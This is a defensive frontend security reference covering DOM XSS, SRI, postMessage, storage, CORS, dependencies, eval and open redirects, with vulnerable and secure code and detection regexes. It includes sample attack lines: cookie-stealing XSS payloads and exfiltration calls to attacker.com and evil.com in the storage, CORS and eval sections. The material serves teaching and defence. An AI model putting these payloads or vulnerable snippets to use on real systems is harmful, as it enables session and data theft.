# Frontend / Client-Side Security Reference

## Overview

Client-side JavaScript runs in an untrusted environment where attackers can
manipulate the DOM, intercept messages, and abuse browser APIs. This reference
covers the most critical frontend vulnerability classes, provides detection
patterns, and includes vulnerable and secure code examples for each topic.

Relevant standards: OWASP A03:2021 (Injection), OWASP A05:2021 (Security
Misconfiguration), OWASP A07:2021 (Identification and Authentication Failures),
CWE-79 (XSS), CWE-346 (Origin Validation Error), CWE-922 (Insecure Storage of
Sensitive Information).

---

## 1. DOM-Based XSS

DOM-based XSS occurs entirely in the browser when untrusted data from a
**source** flows into a dangerous **sink** without sanitization. Unlike
reflected or stored XSS, the malicious payload never reaches the server.

### XSS Sinks

A sink is any browser API that can execute code or render HTML.

| Sink | Risk Level | Notes |
|------|-----------|-------|
| `element.innerHTML` | Critical | Parses and renders full HTML |
| `element.outerHTML` | Critical | Replaces the element itself with parsed HTML |
| `document.write()` | Critical | Writes raw HTML into the document stream |
| `document.writeln()` | Critical | Same as `document.write()` with a newline |
| `eval()` | Critical | Executes arbitrary JavaScript |
| `setTimeout(string, ms)` | Critical | Calls `eval()` internally when passed a string |
| `setInterval(string, ms)` | Critical | Same as `setTimeout` with string argument |
| `Function(string)` | Critical | Constructs and returns a new function from a string |
| `jQuery.html()` | Critical | Delegates to `innerHTML` |
| `jQuery.append()` | High | Parses HTML strings before insertion |
| `jQuery.prepend()` | High | Same behavior as `.append()` |
| `element.insertAdjacentHTML()` | Critical | Parses HTML at the specified position |
| `location.href = ...` | High | Can navigate to `javascript:` URLs |
| `location.assign()` | High | Same as `location.href` assignment |

### XSS Sources

A source is any browser-accessible value that an attacker can control.

| Source | Attacker Control | Example |
|--------|-----------------|---------|
| `location.hash` | Full | `https://example.com/#<img onerror=alert(1) src=x>` |
| `location.search` | Full | `?q=<script>alert(1)</script>` |
| `location.href` | Full | Entire URL can be crafted |
| `document.referrer` | Partial | Attacker controls the referring page |
| `window.name` | Full | Set by the opener window, persists across navigations |
| `postMessage` data | Full | Any origin can send messages unless validated |
| `document.cookie` | Partial | Attacker may inject via subdomain or XSS |
| `document.URL` | Full | Alias for `location.href` |
| `Web Storage` | Conditional | If attacker has prior XSS, storage is compromised |

### Source-to-Sink Tracing Methodology

1. **Identify sources**: Search for all reads of `location.*`, `document.referrer`, `window.name`, and `postMessage` event handlers.
2. **Trace data flow**: Follow each source value through assignments, function parameters, and return values.
3. **Check sanitization**: At each step, verify whether the value is sanitized before reaching a sink. Encoding must match the context (HTML entity encoding for HTML sinks, JavaScript escaping for JS sinks).
4. **Identify sinks**: Flag any point where the traced value reaches a sink listed above.
5. **Verify exploitability**: Craft a proof-of-concept URL or message to confirm the vulnerability.

### Vulnerable Examples

```javascript
// VULNERABLE: innerHTML with location.hash
// URL: https://example.com/#<img src=x onerror=alert(document.cookie)>
const userContent = decodeURIComponent(location.hash.substring(1));
document.getElementById('output').innerHTML = userContent;
```

```javascript
// VULNERABLE: document.write with location.search
// URL: https://example.com/?name=<script>alert(1)</script>
const params = new URLSearchParams(location.search);
document.write('<h1>Hello, ' + params.get('name') + '</h1>');
```

```javascript
// VULNERABLE: eval with location.hash
// URL: https://example.com/#alert(document.cookie)
const code = location.hash.substring(1);
eval(code);
```

```javascript
// VULNERABLE: setTimeout with string argument from user input
const action = new URLSearchParams(location.search).get('action');
setTimeout('handleAction("' + action + '")', 1000);
// Attacker: ?action=");alert(document.cookie);//
```

```javascript
// VULNERABLE: jQuery .html() with user input
const fragment = location.hash.substring(1);
$('#content').html(fragment);
```

```javascript
// VULNERABLE: outerHTML with user-controlled data
const template = new URLSearchParams(location.search).get('tpl');
document.getElementById('widget').outerHTML = template;
```

### Secure Examples

```javascript
// SECURE: Use textContent instead of innerHTML
const userContent = decodeURIComponent(location.hash.substring(1));
document.getElementById('output').textContent = userContent;
```

```javascript
// SECURE: Use DOM APIs to build elements
const params = new URLSearchParams(location.search);
const heading = document.createElement('h1');
heading.textContent = 'Hello, ' + params.get('name');
document.body.appendChild(heading);
```

```javascript
// SECURE: setTimeout with a function reference, never a string
const action = new URLSearchParams(location.search).get('action');
setTimeout(() => handleAction(action), 1000);
```

```javascript
// SECURE: jQuery .text() instead of .html()
const fragment = location.hash.substring(1);
$('#content').text(fragment);
```

```javascript
// SECURE: DOMPurify for cases where HTML rendering is required
import DOMPurify from 'dompurify';

const userContent = decodeURIComponent(location.hash.substring(1));
const clean = DOMPurify.sanitize(userContent);
document.getElementById('output').innerHTML = clean;
```

### Detection Patterns

Run as `grep -rnP` (PCRE) so the `\s` and character-class escapes behave as expected; for POSIX-ERE grep use `[[:space:]]` in place of `\s`.

```bash
# DOM-based XSS sinks (PCRE)
grep -rnP '\.innerHTML\s*=' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
grep -rnP '\.outerHTML\s*=' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
grep -rnP 'document\.write(ln)?\s*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
grep -rnP '\beval\s*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
grep -rnP 'setTimeout\s*\(\s*['\''"`]' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
grep -rnP 'setInterval\s*\(\s*['\''"`]' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
grep -rnP 'new\s+Function\s*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
grep -rnP '\.insertAdjacentHTML\s*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
grep -rnP '\$\(.*\)\.(html|append)\s*\(' --include='*.js' --include='*.ts' .
```

---

## 2. Subresource Integrity (SRI)

SRI allows the browser to verify that a fetched resource (script or stylesheet)
has not been tampered with. Without SRI, a compromised CDN can inject malicious
code into every site that loads resources from it.

### When to Use SRI

- **Always** for scripts and stylesheets loaded from third-party CDNs.
- **Recommended** for any resource served from a domain you do not fully control.
- **Optional** for resources served from your own origin (same-origin resources are already trusted).

### How to Generate SRI Hashes

```bash
# Generate sha384 hash (recommended algorithm)
cat library.js | openssl dgst -sha384 -binary | openssl base64 -A
# Output: oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC

# Generate sha256 hash
shasum -a 256 library.js | awk '{print $1}' | xxd -r -p | base64

# Using the srihash.org web tool or npm package
npx ssri library.js
```

Supported algorithms: `sha256`, `sha384`, `sha512`. Use `sha384` as the default;
it provides a good balance of security and performance.

### crossorigin Attribute Requirement

SRI requires the `crossorigin` attribute to be set on cross-origin resources.
Without it, the browser will not perform integrity validation and will fail
silently or with a CORS error.

### Vulnerable Example (No SRI)

```html
<!-- VULNERABLE: No integrity check. A CDN compromise serves malicious code. -->
<script src="https://cdn.example.com/jquery-3.7.1.min.js"></script>
<link rel="stylesheet" href="https://cdn.example.com/bootstrap-5.3.0.min.css">
```

### Secure Example (With SRI)

```html
<!-- SECURE: Browser verifies hash before executing the script -->
<script
  src="https://cdn.example.com/jquery-3.7.1.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>

<!-- SECURE: SRI for stylesheets -->
<link
  rel="stylesheet"
  href="https://cdn.example.com/bootstrap-5.3.0.min.css"
  integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
  crossorigin="anonymous"
>

<!-- SECURE: Multiple hash algorithms for fallback -->
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha256-abc123... sha384-def456..."
  crossorigin="anonymous"
></script>
```

### Detection Patterns

```
# Find external scripts/stylesheets missing integrity attribute
<script[^>]+src=["']https?://[^"']+["'][^>]*>  (without 'integrity' in the tag)
<link[^>]+href=["']https?://[^"']+["'][^>]*>   (without 'integrity' in the tag)
```

---

## 3. postMessage Security

The `postMessage` API enables cross-origin communication between windows and
iframes. Improper use creates two classes of vulnerabilities: **receiving
untrusted messages** (missing origin validation) and **sending messages to
untrusted origins** (wildcard `targetOrigin`).

### Vulnerability: Missing Origin Validation

```javascript
// VULNERABLE: Accepts messages from any origin
window.addEventListener('message', function (event) {
  // No origin check - any window can send this message
  document.getElementById('output').innerHTML = event.data;
});
```

An attacker can open the target page in an iframe and send arbitrary messages:

```html
<!-- Attacker's page -->
<iframe id="target" src="https://victim.com/page"></iframe>
<script>
  const target = document.getElementById('target').contentWindow;
  target.postMessage('<img src=x onerror=alert(document.cookie)>', '*');
</script>
```

### Vulnerability: Wildcard targetOrigin

```javascript
// VULNERABLE: Sends sensitive data to any origin
// If the child iframe navigates away, the secret goes to the attacker
const childFrame = document.getElementById('child').contentWindow;
childFrame.postMessage({ token: 'secret-session-token' }, '*');
```

### Vulnerability: Structured Clone Attacks

`postMessage` uses the structured clone algorithm, which can transfer complex
objects including `Blob`, `ArrayBuffer`, `File`, and `MessagePort`. An attacker
can send unexpected object types to trigger type confusion in the handler.

```javascript
// VULNERABLE: Assumes event.data is a simple string
window.addEventListener('message', function (event) {
  if (event.origin !== 'https://trusted.com') return;
  // If event.data is an object with a toString() override, this may behave
  // unexpectedly. If it is used in a sink, it can lead to XSS.
  eval('config = ' + event.data);
});
```

### Secure Examples

```javascript
// SECURE: Validate origin and use textContent instead of innerHTML
window.addEventListener('message', function (event) {
  // Strict origin allowlist
  const allowedOrigins = [
    'https://trusted-partner.com',
    'https://app.example.com'
  ];

  if (!allowedOrigins.includes(event.origin)) {
    console.warn('Rejected message from untrusted origin:', event.origin);
    return;
  }

  // Validate message shape and type
  if (typeof event.data !== 'string') {
    console.warn('Rejected non-string message');
    return;
  }

  // Use safe sink
  document.getElementById('output').textContent = event.data;
});
```

```javascript
// SECURE: Explicit targetOrigin when sending messages
const childFrame = document.getElementById('child').contentWindow;
childFrame.postMessage(
  { action: 'updateSettings', theme: 'dark' },
  'https://trusted-child.example.com'  // Only delivered if child is on this origin
);
```

### Detection Patterns

```
# Missing origin validation in message handlers
addEventListener\s*\(\s*['"]message['"]   (then check for event.origin validation)

# Wildcard targetOrigin in postMessage calls
\.postMessage\s*\([^)]*,\s*['"\*]
```

---

## 4. Client-Side Storage Security

`localStorage` and `sessionStorage` are accessible to any JavaScript running on
the same origin. A single XSS vulnerability grants the attacker full read/write
access to all stored data.

### What Never to Store in Client-Side Storage

| Data Type | Risk | Reason |
|-----------|------|--------|
| Authentication tokens (JWT, API keys) | Critical | Stolen via XSS, no httpOnly protection |
| Session IDs | Critical | Enables session hijacking |
| PII (email, SSN, phone) | High | Exposed to any XSS, persists after tab close |
| Passwords or secrets | Critical | Plaintext accessible to all scripts on origin |
| CSRF tokens | High | Defeats the purpose if accessible to attacker scripts |
| Financial data | High | Regulatory compliance violations (PCI-DSS) |

### Vulnerable Examples

```javascript
// VULNERABLE: Storing JWT in localStorage
function handleLogin(response) {
  localStorage.setItem('auth_token', response.jwt);
  localStorage.setItem('refresh_token', response.refreshToken);
}

// Any XSS can steal these tokens:
// new Image().src = 'https://attacker.com/steal?t=' + localStorage.getItem('auth_token');
```

```javascript
// VULNERABLE: Storing user PII in sessionStorage
sessionStorage.setItem('user_email', user.email);
sessionStorage.setItem('user_ssn', user.ssn);
sessionStorage.setItem('credit_card', user.cardNumber);
```

### Secure Alternatives

```javascript
// SECURE: Use httpOnly cookies for authentication tokens
// Set by the server - not accessible to JavaScript at all

// Server response header:
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

// On the client, use credentials: 'include' for fetch requests
fetch('/api/data', {
  method: 'GET',
  credentials: 'include'  // Sends httpOnly cookies automatically
});
```

```javascript
// SECURE: If you must store non-sensitive preferences client-side,
// never store secrets alongside them
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'en');
localStorage.setItem('sidebar_collapsed', 'true');
// These are acceptable - no security impact if stolen
```

```javascript
// SECURE: Use server-side sessions for sensitive state
// The browser only holds a session cookie (httpOnly, Secure, SameSite)
// All sensitive data lives on the server

// Instead of:
//   localStorage.setItem('cart_total', '599.99');
//   localStorage.setItem('discount_code', 'SAVE50');
// Use:
fetch('/api/cart', {
  method: 'GET',
  credentials: 'include'
}).then(r => r.json()).then(cart => renderCart(cart));
```

### Detection Patterns

```
# Sensitive data in storage operations
localStorage\.setItem\s*\(\s*['"][^'"]*(?:token|secret|password|key|session|jwt|auth|ssn|credit)[^'"]*['"]
sessionStorage\.setItem\s*\(\s*['"][^'"]*(?:token|secret|password|key|session|jwt|auth|ssn|credit)[^'"]*['"]
```

---

## 5. CORS Misconfiguration

Cross-Origin Resource Sharing (CORS) allows servers to relax the Same-Origin
Policy. Misconfigured CORS headers can let attackers read authenticated
responses from a victim's browser.

### Vulnerability: Wildcard with Credentials

The combination of `Access-Control-Allow-Origin: *` and
`Access-Control-Allow-Credentials: true` is explicitly forbidden by the
specification, but some servers attempt it. Browsers will block the response,
but some custom middleware may not enforce this correctly.

### Vulnerability: Origin Reflection

Reflecting the request's `Origin` header verbatim in `Access-Control-Allow-Origin`
is equivalent to allowing every origin. Combined with credentials, this is the
most common exploitable CORS misconfiguration.

```
# Attacker sends:
Origin: https://evil.com

# Vulnerable server responds:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### Vulnerability: Null Origin Exploitation

Some servers whitelist the `null` origin. An attacker can trigger a `null` origin
using sandboxed iframes or data: URLs.

```html
<!-- Attacker page: sends request with Origin: null -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://victim.com/api/user', { credentials: 'include' })
      .then(r => r.json())
      .then(data => {
        // Exfiltrate data
        new Image().src = 'https://attacker.com/steal?d=' + JSON.stringify(data);
      });
  </script>
"></iframe>
```

### Vulnerable Server Configurations

```php
<?php
// VULNERABLE: Reflects any origin with credentials
header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']);
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
```

```nginx
# VULNERABLE: Nginx reflecting origin without validation
location /api/ {
    if ($http_origin) {
        add_header 'Access-Control-Allow-Origin' $http_origin;
        add_header 'Access-Control-Allow-Credentials' 'true';
    }
}
```

```apache
# VULNERABLE: Apache allowing all origins with credentials
<IfModule mod_headers.c>
    SetEnvIf Origin ".*" ORIGIN=$0
    Header set Access-Control-Allow-Origin "%{ORIGIN}e"
    Header set Access-Control-Allow-Credentials "true"
</IfModule>
```

### Secure Server Configurations

```php
<?php
// SECURE: Strict origin allowlist
$allowedOrigins = [
    'https://app.example.com',
    'https://admin.example.com',
];

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowedOrigins, true)) {
    header('Access-Control-Allow-Origin: ' . $origin);
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type, Authorization');
    header('Access-Control-Max-Age: 86400');
    // Vary header is critical: prevents cache poisoning
    header('Vary: Origin');
}

// Reject preflight from unknown origins
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code($origin ? 204 : 403);
    exit;
}
```

```nginx
# SECURE: Nginx with origin allowlist using map
map $http_origin $cors_origin {
    default "";
    "https://app.example.com" $http_origin;
    "https://admin.example.com" $http_origin;
}

location /api/ {
    if ($cors_origin) {
        add_header 'Access-Control-Allow-Origin' $cors_origin always;
        add_header 'Access-Control-Allow-Credentials' 'true' always;
        add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS' always;
        add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;
        add_header 'Vary' 'Origin' always;
    }

    if ($request_method = 'OPTIONS') {
        add_header 'Access-Control-Max-Age' 86400;
        add_header 'Content-Length' 0;
        return 204;
    }
}
```

```apache
# SECURE: Apache with origin allowlist
<IfModule mod_headers.c>
    SetEnvIf Origin "^https://(app|admin)\.example\.com$" ORIGIN=$0
    Header set Access-Control-Allow-Origin "%{ORIGIN}e" env=ORIGIN
    Header set Access-Control-Allow-Credentials "true" env=ORIGIN
    Header set Access-Control-Allow-Methods "GET, POST, OPTIONS" env=ORIGIN
    Header set Vary "Origin"
</IfModule>
```

### Detection Patterns

```
# Origin reflection without validation
Access-Control-Allow-Origin.*\$.*origin
Access-Control-Allow-Origin.*\$_SERVER\['HTTP_ORIGIN'\]
Access-Control-Allow-Origin.*\$http_origin

# Wildcard origin with credentials (spec violation, but attempted)
Access-Control-Allow-Origin.*\*
Access-Control-Allow-Credentials.*true

# Null origin in allowlist
Access-Control-Allow-Origin.*null
```

---

## 6. JavaScript Dependency Security

Third-party dependencies are the largest attack surface in modern frontend
applications. A single compromised package can exfiltrate data from every
application that installs it.

### Auditing Dependencies

```bash
# npm: built-in audit
npm audit
npm audit --production    # Only production dependencies
npm audit fix             # Auto-fix where possible
npm audit fix --force     # Force major version bumps (review changes!)

# yarn (v1)
yarn audit
yarn audit --level critical

# yarn (v2+/berry)
yarn npm audit

# pnpm
pnpm audit
pnpm audit --production
```

### Supply Chain Security Tools

| Tool | Capability |
|------|-----------|
| `npm audit` / `yarn audit` | Known vulnerability database (GitHub Advisory DB) |
| Snyk | Vulnerability scanning + fix PRs + license compliance |
| Socket.dev | Detects supply chain attacks: typosquatting, install scripts, obfuscated code, network access |
| Renovate / Dependabot | Automated dependency update PRs |
| `npm-audit-resolver` | Track audit exceptions and resolutions |

### Lock File Integrity

Lock files (`package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`) pin exact
dependency versions and integrity hashes. They are critical for reproducible
and secure builds.

```bash
# Verify lock file is in sync with package.json
npm ci            # Fails if lock file is out of sync (use in CI)
yarn install --frozen-lockfile   # yarn v1
yarn install --immutable         # yarn v2+

# Never run `npm install` or `yarn install` in CI - always use the
# lock-file-strict variant to prevent unexpected dependency resolution
```

**Key practices:**
- Always commit lock files to version control.
- Review lock file diffs in pull requests for unexpected changes.
- Use `npm ci` (not `npm install`) in CI/CD pipelines.
- Enable `ignore-scripts` in `.npmrc` to prevent install-time code execution for untrusted packages.

### CI Integration Examples

```yaml
# GitHub Actions: dependency audit step
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
      - run: npm audit --audit-level=high
      - name: Socket.dev analysis
        uses: SocketDev/socket-security-action@v1
```

```yaml
# GitLab CI: dependency scanning
dependency_audit:
  stage: test
  image: node:20
  script:
    - npm ci
    - npm audit --audit-level=high
  allow_failure: false
```

### Detection Patterns

```
# Missing lock file
# Verify presence of package-lock.json, yarn.lock, or pnpm-lock.yaml

# .npmrc without ignore-scripts
# Check for: ignore-scripts=true

# CI using `npm install` instead of `npm ci`
npm install(?!\s+--package-lock-only)
yarn install(?!\s+--frozen-lockfile|--immutable)
```

---

## 7. Dynamic Code Execution

Any API that converts a string into executable code is a potential injection
point. These should be avoided entirely or locked down with strict input
validation.

### Dangerous APIs

| API | Danger |
|-----|--------|
| `eval(string)` | Executes arbitrary JS in the current scope |
| `new Function(string)` | Creates a function from a string body |
| `setTimeout(string, ms)` | Implicitly calls `eval()` on the string |
| `setInterval(string, ms)` | Same as `setTimeout` with string |
| `document.write(string)` | Injects raw HTML into the document stream |

### Vulnerability: eval() with User Input

```javascript
// VULNERABLE: eval() with data from the URL
const expr = new URLSearchParams(location.search).get('calc');
const result = eval(expr);
document.getElementById('result').textContent = result;
// Attacker: ?calc=fetch('https://evil.com/steal?c='+document.cookie)
```

### Vulnerability: Function Constructor

```javascript
// VULNERABLE: Function constructor with user input
const operation = getUserInput();
const fn = new Function('a', 'b', 'return a ' + operation + ' b');
console.log(fn(2, 3));
// Attacker input: "+ 0; fetch('https://evil.com/steal?c='+document.cookie); //"
```

### Vulnerability: Template Literal Injection

```javascript
// VULNERABLE: Client-side template literal injection via dynamic evaluation.
// If `name` is attacker-controlled, the backtick template is parsed fresh
// in page context, and expression substitution runs arbitrary JavaScript.
const greeting = eval('`Hello, ${name}!`');
// Attacker name: ${constructor.constructor('return this')().fetch('https://evil.com')}
```

```javascript
// VULNERABLE: Dynamic template construction
const userTemplate = getUserInput();
const render = new Function('data', 'return `' + userTemplate + '`');
render({ name: 'Alice' });
// Attacker: ${constructor.constructor("alert(1)")()}
```

### Secure Examples

```javascript
// SECURE: Use a safe math parser instead of eval()
// Libraries: mathjs, expr-eval, math-expression-evaluator
import { evaluate } from 'mathjs';

const expr = new URLSearchParams(location.search).get('calc');
try {
  // mathjs sandboxes execution - no access to globals
  const result = evaluate(expr);
  document.getElementById('result').textContent = String(result);
} catch (e) {
  document.getElementById('result').textContent = 'Invalid expression';
}
```

```javascript
// SECURE: Allowlist of operations instead of dynamic code
const OPERATIONS = {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b,
  divide: (a, b) => (b !== 0 ? a / b : NaN),
};

const operation = getUserInput();
if (operation in OPERATIONS) {
  console.log(OPERATIONS[operation](2, 3));
} else {
  console.error('Unknown operation');
}
```

```javascript
// SECURE: Always pass functions (not strings) to setTimeout/setInterval
setTimeout(() => {
  handleAction(sanitizedInput);
}, 1000);

setInterval(() => {
  pollServer();
}, 5000);
```

### Detection Patterns

```
# Dynamic code execution
eval\s*\(
new\s+Function\s*\(
setTimeout\s*\(\s*['"`]
setInterval\s*\(\s*['"`]
setTimeout\s*\(\s*[^()\s,]+\s*,    # Variable (might be a string) passed to setTimeout
document\.write\s*\(
```

---

## 8. Client-Side Open Redirects

Open redirects allow an attacker to use a trusted domain to redirect victims to
a malicious site. They are commonly used in phishing attacks and OAuth token
theft.

### Vulnerability: window.location with User Input

```javascript
// VULNERABLE: Direct assignment from URL parameter
const target = new URLSearchParams(location.search).get('redirect');
window.location.href = target;
// Attacker: ?redirect=https://evil.com/phishing

// VULNERABLE: Also exploitable with javascript: URLs
// Attacker: ?redirect=javascript:alert(document.cookie)
```

```javascript
// VULNERABLE: location.assign() with user input
const next = new URLSearchParams(location.search).get('next');
window.location.assign(next);
```

```javascript
// VULNERABLE: location.replace() with user input
const returnUrl = new URLSearchParams(location.search).get('return');
window.location.replace(returnUrl);
```

### Vulnerability: Meta Refresh with User Input

```html
<!-- VULNERABLE: Server renders user input into meta refresh -->
<meta http-equiv="refresh" content="0;url=USER_INPUT_HERE">
```

### URL Validation Patterns

```javascript
// INSECURE VALIDATION: Easily bypassed
function isRelativeUrl(url) {
  return url.startsWith('/');
}
// Bypass: //evil.com (protocol-relative URL, treated as absolute)

// INSECURE VALIDATION: Substring check
function isSafeUrl(url) {
  return url.includes('example.com');
}
// Bypass: https://evil.com/example.com or https://example.com.evil.com
```

### Secure Examples

```javascript
// SECURE: Parse URL and validate origin against allowlist
function safeRedirect(userUrl, allowedOrigins) {
  // Default to a safe fallback
  const fallback = '/';

  try {
    const parsed = new URL(userUrl, window.location.origin);

    // Block javascript: and data: schemes
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return fallback;
    }

    // Validate against allowlist of trusted origins
    if (!allowedOrigins.includes(parsed.origin)) {
      return fallback;
    }

    return parsed.href;
  } catch (e) {
    // Invalid URL
    return fallback;
  }
}

// Usage
const target = new URLSearchParams(location.search).get('redirect');
const allowed = [
  'https://app.example.com',
  'https://accounts.example.com'
];
window.location.href = safeRedirect(target, allowed);
```

```javascript
// SECURE: Allow only relative paths (same-origin redirects)
function safeRelativeRedirect(userPath) {
  const fallback = '/';

  try {
    const parsed = new URL(userPath, window.location.origin);

    // Ensure the origin matches (rejects //evil.com and absolute URLs)
    if (parsed.origin !== window.location.origin) {
      return fallback;
    }

    // Return only the path + search + hash (strip origin for safety)
    return parsed.pathname + parsed.search + parsed.hash;
  } catch (e) {
    return fallback;
  }
}
```

### Detection Patterns

```
# Open redirect sinks with user input from URL parameters
location\.href\s*=\s*.*(?:URLSearchParams|location\.search|location\.hash|getParameter)
location\.assign\s*\(.*(?:URLSearchParams|location\.search|location\.hash)
location\.replace\s*\(.*(?:URLSearchParams|location\.search|location\.hash)
window\.open\s*\(.*(?:URLSearchParams|location\.search|location\.hash)
```

---

## Prevention Checklist

### DOM-Based XSS
- [ ] Use `textContent` and `setAttribute` instead of `innerHTML` and `outerHTML`
- [ ] Never pass strings to `eval()`, `setTimeout()`, `setInterval()`, or `new Function()`
- [ ] Sanitize with DOMPurify before any unavoidable HTML rendering
- [ ] Deploy Content-Security-Policy with `script-src` restrictions and nonces
- [ ] Audit all uses of jQuery `.html()`, `.append()`, `.prepend()`, and `.after()`

### Subresource Integrity
- [ ] Add `integrity` and `crossorigin` attributes to all third-party `<script>` and `<link>` tags
- [ ] Automate SRI hash generation in the build pipeline
- [ ] Monitor for SRI hash mismatches in CSP violation reports

### postMessage
- [ ] Validate `event.origin` against an explicit allowlist in every `message` handler
- [ ] Validate `event.data` type and shape before processing
- [ ] Never use `'*'` as the `targetOrigin` when sending sensitive data
- [ ] Use `MessageChannel` for trusted bidirectional communication

### Client-Side Storage
- [ ] Never store authentication tokens, secrets, or PII in `localStorage` or `sessionStorage`
- [ ] Use `httpOnly`, `Secure`, `SameSite=Strict` cookies for authentication
- [ ] Audit all `setItem` calls for sensitive data patterns
- [ ] Clear storage on logout (`localStorage.clear()`, `sessionStorage.clear()`)

### CORS Configuration
- [ ] Validate request `Origin` against an explicit allowlist (never reflect blindly)
- [ ] Never allow `null` as a trusted origin
- [ ] Always set the `Vary: Origin` response header when CORS headers are dynamic
- [ ] Limit `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` to what is needed
- [ ] Set `Access-Control-Max-Age` to reduce preflight request volume

### Dependency Security
- [ ] Run `npm audit` / `yarn audit` in CI and fail the build on high/critical findings
- [ ] Use `npm ci` (not `npm install`) in CI/CD pipelines
- [ ] Commit and review lock file changes
- [ ] Enable `ignore-scripts` in `.npmrc` for untrusted packages
- [ ] Use Socket.dev or Snyk for supply chain attack detection

### Dynamic Code Execution
- [ ] Ban `eval()` and `new Function()` via ESLint rules (`no-eval`, `no-new-func`, `no-implied-eval`)
- [ ] Enforce CSP `script-src` without `'unsafe-eval'`
- [ ] Use safe alternatives (math parsers, operation allowlists, function references)

### Open Redirects
- [ ] Parse all redirect targets with `new URL()` and validate the origin
- [ ] Block `javascript:` and `data:` URL schemes
- [ ] Maintain an explicit allowlist of permitted redirect origins
- [ ] Prefer relative paths for same-site redirects
- [ ] Log and alert on blocked redirect attempts
